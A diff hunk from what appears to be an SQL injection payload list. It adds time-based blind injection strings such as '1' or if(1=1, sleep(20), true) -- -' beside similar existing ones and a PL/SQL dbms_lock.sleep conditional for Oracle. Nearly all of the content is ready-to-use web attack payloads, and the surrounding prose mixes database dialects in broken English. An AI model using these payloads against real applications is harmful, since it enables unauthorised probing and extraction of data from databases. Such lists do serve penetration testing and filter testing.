@@ -4,11 +4,14 @@ The UTL_INADDR package provides a PL/SQL procedures to support internet addressi
 When an Web application is being used Oracle Database. there is only possible to perform  SQL Injection PL/SQL Syntax Like IF condition THEN when_true [ELSE when_false] END IF.
 IF (1=1) THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END
 ```
-
 1' and if(1=1, sleep(20), true)#
 1' or if(1=1, sleep(20), true)#
 1' and if(1=1, sleep(20), false)#
 1' or if(1=1, sleep(20), true)#
+1' and if(1=1, sleep(20), true) -- -
+1' or if(1=1, sleep(20), true) -- -
+1' and if(1=1, sleep(20), false) -- -
+1' or if(1=1, sleep(20), true) -- -
 ```
 
 ```
